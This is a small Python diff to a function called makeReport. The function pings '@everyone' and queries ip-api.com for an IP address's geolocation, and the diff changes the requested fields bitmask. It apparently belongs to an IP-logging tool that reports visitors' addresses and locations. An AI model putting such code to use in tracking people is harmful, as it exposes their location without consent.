@@ -130,7 +130,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     ping = "@everyone"
 
     try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16993241", timeout=5).json()
     except Exception:
         info = {}
 
